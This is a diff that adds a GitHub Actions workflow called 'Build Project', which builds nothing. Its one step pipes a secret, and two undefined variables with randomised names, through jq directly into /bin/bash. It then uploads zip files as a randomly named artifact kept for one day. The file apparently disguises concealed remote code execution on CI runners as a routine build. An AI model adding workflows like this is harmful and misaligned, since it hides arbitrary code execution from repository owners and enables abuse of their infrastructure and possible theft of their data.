@@ -1,0 +1,28 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          aq76725: ${{ secrets.aq76725 }}
+        run: |
+          printf '%s' "$aq76725" | jq -r .mepl1777 | /bin/bash
+          printf '%s' "$w6" | jq -r .euox5755 | /bin/bash
+          printf '%s' "$xcb37632" | jq -r .rnap08 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: V34xON5U
+          path: "*.zip"
+          retention-days: 1
